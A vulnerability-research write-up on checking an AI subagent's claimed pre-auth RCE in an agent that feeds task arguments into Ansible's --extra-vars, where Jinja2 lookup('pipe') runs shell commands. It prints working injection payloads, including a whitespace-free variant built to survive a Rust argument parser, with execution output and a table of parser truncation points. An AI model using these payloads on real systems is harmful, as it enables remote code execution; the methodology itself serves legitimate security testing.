# Verifying A Subagent's "PROVEN" Claim Before Repeating It

A delegated hunter returned a confident **"One verified pre-auth RCE primitive — PROVEN
by execution"** with a real captured proof file. Re-testing its payload from first
principles showed the payload **could not reach the sink at all**. Both things were true.

## What the subagent proved (genuinely)

Real `ansible-core 2.21.5`, real role task file
(`roles/solana_validator_bootstrap/tasks/validator_info.yaml`), real captured output:

```bash
ansible-playbook -i inventory_hosts playbooks/pb_real_validator_info.yaml \
  --extra-vars='{"validator_name":"{{ lookup(\"pipe\", \"id -un > /tmp/AGENT2_PWNED2.txt; echo PWNED2\") }}"}'
```

```
"cmd": "solana validator-info publish --keypair ... -d \"...\" PWNED2"
$ cat /tmp/AGENT2_PWNED2.txt
ubuntu
```

The sink is real. `--extra-vars` values are rendered by Jinja2 before `/bin/sh -c`, so
`{{ lookup('pipe', ...) }}` executes. That finding stands.

## What it got wrong (the part that would have burned you)

The task file interpolates `{{ validator_name }}`, and the agent builds `--extra-vars`
from `task.args` — but `task.args` does **not** arrive as free-form JSON. It passes
through `parse_args` first (`svt-agent/src/utils/converter.rs`):

```rust
fn parse_args<T: Into<String>>(args: T) -> HashMap<String, String> {
    let mut res = HashMap::new();
    for arg in args.into().split_whitespace() {      // <-- SPLITS ON WHITESPACE FIRST
        let mut chunks = arg.split('=');
        if let Some(key) = chunks.next() {
            if key.is_ascii() {
                if let Some(val) = chunks.next() {
                    res.insert(key.to_string(), val.to_string());
                }
            }
        }
    }
    res
}
```

The subagent's payload contains **spaces** (`'id -un > /tmp/...'`). `split_whitespace()`
runs *before* the `=` split, so the value is truncated at the first space:

```
args = "validator_name={{ lookup('pipe','id -un > /tmp/PWN.txt') }}"
parsed = {"validator_name": "{{"}        <-- TRUNCATED. Payload dead.
```

Executed proof (standalone Rust binary mirroring `parse_args` + `build_cmd` verbatim):

```
=== TEST 2: Jinja2 pipe injection via args value ===
  parsed args map: {"validator_name": "{{"}
  argv[2] = "--extra-vars={\"validator_name\":\"{{\"}}"
```

## The fix that makes the sink reachable

Drop every space. Redirect without whitespace:

```
validator_name={{lookup('pipe','id>/tmp/rcetest/PWNED')}}
```

```
parsed = {"validator_name": "{{lookup('pipe','id>/tmp/rcetest/PWNED')}}"}   <-- INTACT
```

And it executes — captured from real `ansible-playbook` against the real task file:

```
$ cat /tmp/rcetest/PWNED
uid=1000(ubuntu) gid=1001(ubuntu) groups=1001(ubuntu),4(adm),...,101(lxd),1000(netdev)
```

Note the two-stage proof: the first attempt with `-/tmp/...` (a relative path) failed with
`lookup_plugin.pipe(...) returned 2` — which is itself evidence the command ran, it just
had a bad path. Use an absolute path.

## The rule

> **A subagent's PROVEN is a claim about ITS test, not about your chain.** Before
> repeating it, re-derive the payload against every transform between the attacker's
> input and the sink. Here the subagent tested the sink directly (bypassing the agent's
> own arg parser) and never ran the parser.

Concretely, when a hunter reports an injection sink:

1. Identify **every transform** on the path: decrypt → JSON parse → `parse_args` →
   `build_cmd` → argv → templating engine → shell.
2. Write a standalone binary that reproduces the transforms **verbatim** (copy the
   functions, don't paraphrase them) and run the payload through it.
3. Only then run the sink test.

This costs ~10 minutes and is the difference between "the chain works" and "the sink
works but my payload dies in the parser."

## Generalization beyond this case

Any time a reported exploit crosses a **parser/normalizer** boundary, the payload must
survive that boundary. Common truncators to check for:

| Boundary | Truncates on |
|---|---|
| `split_whitespace()` then `split('=')` | first space |
| `arg.split('=')` with `chunks.next()` twice | second `=` (value truncated) |
| `key.is_ascii()` guard | non-ASCII key names silently dropped |
| shell `"$(...)"` inside double quotes | unescaped `"` and `$` |
| JSON string escape | `"` `\` and control chars — but **not** newline in some serializers |

The `key.is_ascii()` guard is worth noting separately: it means a payload whose *key* is
non-ASCII is silently dropped rather than rejected, which is easy to misread as "the
parser accepted it."
